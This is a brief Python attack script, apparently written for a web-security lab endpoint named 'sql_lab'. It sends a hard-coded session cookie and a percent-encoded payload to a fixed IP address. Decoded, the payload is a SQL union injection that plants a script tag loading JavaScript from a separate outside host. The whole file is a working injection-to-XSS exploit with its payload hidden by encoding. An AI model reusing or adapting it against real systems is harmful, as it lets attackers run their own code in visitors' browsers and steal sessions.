#!/usr/bin/env python3
from connect import my_request as req
import urllib.parse


if __name__ == '__main__':
    url = "http://178.208.95.16/sql_lab/chords"
    cook = dict(
        session='eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InJkem9ncyJ9.YnzZMA.c5mcwY9koq-WJE18kKRTNQGbBwI')
    cod = '%30%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%22%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%31%39%33%2e%31%30%37%2e%31%39%32%2e%31%34%31%2f%6a%73%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e%22%2d%2d%20%2d'
    #cod = urllib.parse.urlencode(query, quote_via=urllib.parse.quote)
    param = dict(go = f'http://178.208.95.16/sql_lab/chords?id={cod}')
    
    response = req.post_request(url, param, cook)
    print('\n', response)    